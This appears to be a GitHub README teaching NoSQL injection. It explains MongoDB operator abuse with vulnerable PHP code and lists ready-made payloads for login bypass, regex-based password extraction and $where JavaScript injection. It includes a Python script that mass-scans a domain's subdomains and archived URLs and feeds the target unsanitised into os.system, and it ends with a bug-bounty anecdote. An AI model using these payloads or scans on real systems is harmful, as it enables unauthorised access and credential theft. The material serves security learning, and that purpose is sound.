# NoSQL_injection_stuff

##
#
https://github.com/DevanshRaghav75/NoSQL_injection_stuff/blob/main/README.md
#
##

Learn what is NoSQL injection and how to find them.

Content:
* <a href="https://github.com/DevanshRaghav75/NoSQL_injection_stuff/blob/main/README.md#what-is-nosql-">What is NoSQL database ?</a>
* <a href="https://github.com/DevanshRaghav75/NoSQL_injection_stuff/blob/main/README.md#what-is-nosql-injection-">What is NoSQL injection ?</a>
* <a href="https://github.com/DevanshRaghav75/NoSQL_injection_stuff/blob/main/README.md#why-to-learn-nosql-injection">Why to learn NoSQL injection ?</a>
* <a href="https://github.com/DevanshRaghav75/NoSQL_injection_stuff/blob/main/README.md#mongodb-injection-example-in-a-php-application">MongoDB Injection Example in a PHP Application</a>
* <a href="https://github.com/DevanshRaghav75/NoSQL_injection_stuff/blob/main/README.md#advanced-attacks-and-javascript-injections-ssji-injection"> Advanced Attacks and JavaScript Injections (SSJI injection)</a>
* <a href="https://github.com/DevanshRaghav75/NoSQL_injection_stuff/blob/main/README.md#how-to-automate-nosql-injection">How to automate NoSQL injection ?</a>
* <a href="https://github.com/DevanshRaghav75/NoSQL_injection_stuff/blob/main/README.md#tools-">Tools to automate NoSQL injection</a>
* <a href="https://github.com/DevanshRaghav75/NoSQL_injection_stuff/blob/main/README.md#payloads">NoSQL injection payloads</a>
* <a href="https://github.com/DevanshRaghav75/NoSQL_injection_stuff/blob/main/README.md#nosqli-automation-using-my-tool">NoSQLi automation using my tool</a>
* <a href="https://github.com/DevanshRaghav75/NoSQL_injection_stuff/blob/main/README.md#how-i-found-nosql-injection-on-dutch-goverment-website-and-got-a-t-shirt">How I found NoSQL injection on dutch goverment website</a>


## What is NoSQL ?

When people use the term ```“NoSQL database”```, they typically use it to refer to any non-relational database. Some say the term ```“NoSQL”``` stands for ```“non SQL”``` while others say it stands for ```“not only SQL.”``` Either way, most agree that ```NoSQL databases``` are databases that store data in a format other than relational tables.

A common misconception is that ```NoSQL databases``` or non-relational databases don’t store relationship data well. ```NoSQL databases``` can store relationship data—they just store it differently than relational databases do. In fact, when compared with ```SQL databases```, many find modeling relationship data in ```NoSQL databases``` to be easier than in ```SQL databases```, because related data doesn’t have to be split between tables.

```NoSQL``` data models allow related data to be nested within a single data structure.

```NoSQL databases``` emerged in the late 2000s as the cost of storage dramatically decreased. Gone were the days of needing to create a complex, difficult-to-manage data model simply for the purposes of reducing data duplication. Developers (rather than storage) were becoming the primary cost of software development, so ```NoSQL databases``` optimized for developer productivity.

## What is NoSQL injection ?

A ```NoSQL injection``` vulnerability is an error in a ```web application``` that uses a ```NoSQL database```. This web application security issue lets a malicious party bypass authentication, extract data, modify data, or even gain complete control over the application. ```NoSQL injection``` attacks are the result of a lack of data sanitization.

## Why to learn NoSQL injection ?

Now most of the websites are using ```NoSQL database```,its difficult to find ```SQL injection``` on websites so its time to upgrade to ```NoSQL injection```.

## MongoDB Injection Example in a PHP Application

To understand how a ```NoSQL``` query is constructed and how it is vulnerable to an `injection` attack, we will focus on the most popular ```NoSQL database```: `MongoDB`, and we will access it using `PHP`. Here is a simple example of a code snippet that accesses a `MongoDB` for authentication purposes.

* Vulnerable code
```PHP
$username = $_POST['username'];
$password = $_POST['password'];
$connection = new MongoDB\Client('mongodb://localhost:27017');
if($connection) {
	$db = $connection->test;
	$users = $db->users;
	$query = array(
		"user" => $username,
		"password" => $password
	);
	$req = $users->findOne($query);
}
```

As you can see, in this example, `username` and `password` used for authentication are taken from a `POST` request and then directly used in the query. Similar to other types of `injection`, a `malicious user` may supply a `NoSQL injection payload` that tricks the database.

To perform a successful `MongoDB injection`, it is enough if the attacker supplies the following `malicious` input data as a POST request:

```JSON
username[$eq]=admin&password[$ne]=foo
```
* NOTE: Mongodb uses NoSQL database 

The `[$ne]` query operator means not equal. Therefore, the resulting query will find the first record in which the `username` is admin and the `password` is not foo. If this code is used for authentication, the attacker is logged in as the admin user.

More operators can be used in a similar fashion, for example `[$lt]` and `[$gt]` as well as `[$regex]`. Regular expressions can even allow the attacker to enumerate all users in the above scenario by trying combinations in sequence and evaluating the result.

## Advanced Attacks and JavaScript Injections (SSJI injection)

`MongoDB` queries support a commonly used operator `$where`, which introduces possibilities of serious `NoSQL attacks` that include JavaScript objects.

For example, a developer might want to use the `$where` operator in the following fashion to access a record for a particular user:

```SQL
$query = array('$where' => 'this.name === \''.$name.'\'');
```

In this situation, the attacker may provide the following empty string comparison trick as $name:

```SQL
'; return '' == '
```

As a result, the query will become:

```JSON
"$where": "this.name === ''; return '
```

And the attacker will receive the entire list of users.

Since the $where operator is actually evaluated as JavaScript code, the attacker could also pass a malicious string that includes arbitrary JavaScript, for example:

```JSON
'; while(true){}'
```

## How to automate NoSQL injection ?

There are very less tools and resources `because its new to peoples, I know two tools that will automate the exploitation of `NoSQL injection` but note that these tools can give `false positive` so if these tools find any `NoSQL injection` issue so don't report it before you check that the `injection exists or not`.

## Tools :
* NoSQLi - https://github.com/Charlie-belmer/nosqli
* NoSQLi scanner extenstion of Burp suit

`NoSQLi` is very easy to install, You can just `clone it` or can run `apt-get install nosqli` in your terminal.

But `NoSQLi scanner` is only available for `Burp suit pro users` so if you use burp pro then you can easily use this extension, First goto `Extenter tab` than `search NoSQLi scanner` now click on `install`, If you want to use this extension you can just right click on target then click on Actively scan this host after that the extension will automatically start scanning. 

## Payloads

**Authentication bypass**

```JSON
in DATA
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto

in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}

```

**Extract length information**
```JSON
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

**Extract data information**
```JSON
in URL
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}

```
**These are some payloads you can use to identify NoSQL injection vulnerability:**
```JSON
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
|| 1==1//
|| 1==1%00
}, { password : /.*/ }
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

## NoSQLi automation using my tool

I have created a python script to automate `XSS, SQLI, NOSQLI, LFI, SSRF` so lets see how you can automate NoSQL injection using <a href="https://github.com/DevanshRaghav75/Brahma">Brahma</a>.

**How Brahma automates NoSQL injection ?**<br>
After running `Brahma -d https://example.com -a nosqli` command the Brahma will find subdomains, waybackurls, SQL URLs and then will test every URL using nosqli tool.

**This is the code of Brahma that automates NoSQL injection**

You can modify this code and can make a script for NoSQL injection automation, Hope this will you :)

```python
import time
import os
import re
from Brahma.core.args import target
from Brahma.core.colors import RED, WHITE, GREEN, CYAN, YELLOW
from Brahma.core.styles import RESET, BRIGHT
from os import path

def nosqli():
    print(BRIGHT + GREEN + "[*] " + RESET + "NOSQLI will be automated using: gf, gf_patterns, waybackurls, subfinder, httpx, nosqli")
    time.sleep(2)

    print(BRIGHT + GREEN + "[*] " + RESET + "Finding subdomains using subfinder" )
    print(BRIGHT + GREEN + "[*] " + RESET + "Making results directory")
    os.system("mkdir results")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: subfinder -d " + target + " | tee results/domains.txt ")
    time.sleep(3)
    
    if re.search('https://', target):
        url = target.replace('https://', '')
    elif re.search('http://', target): 
    	url = target.replace('http://', '')
    else:
    	url = target
    
    os.system("subfinder -d " + url + " | tee results/domains.txt")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding working domains from results/domains.txt")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/domains.txt | httpx | tee results/urls.alive")
    time.sleep(3)
    os.system("cat results/domains.txt | httpx | tee results/urls.alive")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding urls using waybackurls")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: cat results/urls.alive | waybackurls | tee results/urls.final")
    time.sleep(3)
    os.system("cat results/urls.alive | waybackurls | tee results/urls.final")
    print(BRIGHT + GREEN + "[*] " + RESET + "Finding SQLi urls using gf and gf_patterns")
    print(BRIGHT + GREEN + "[*] " + RESET + "Running command: gf sqli results/urls.final >> results/urls.nosqli")
    time.sleep(3)
    os.system("gf sqli results/urls.final >> results/urls.nosqli")
    print(BRIGHT + GREEN + "[*] " + RESET + "Testing urls.nosqli one by one using for loops")
    time.sleep(3)
    
    with open ('results/urls.nosqli') as wordlist:
        read = wordlist.readlines()
    for line in read:
        os.system("nosqli scan -t " + line)
    
    print(BRIGHT + YELLOW + "[DONE] " + RESET + "All tasks done!")
```
## How I found NoSQL injection on Dutch goverment website and got a t-shirt

Yes, I found `NoSQL injection` on dutch goverment website so lets see how I found that.

I found it very easily without `recon`, I just used burp `NoSQLI scanner extension`, Its my habit to scan the host activily using Active ++ extension before going in deep like recon, enumeration and all that stuff so as always I used active ++ and NoSQLi extension to find bugs and after waiting 1-2 hours I got some NoSQL/SSJI injection issues so I decided to check that the issue exists or not so I clicked on show response in browser and I found that the injection exists so I reported that and as a token of appreciation they gave me a t-shirt.

THE END !
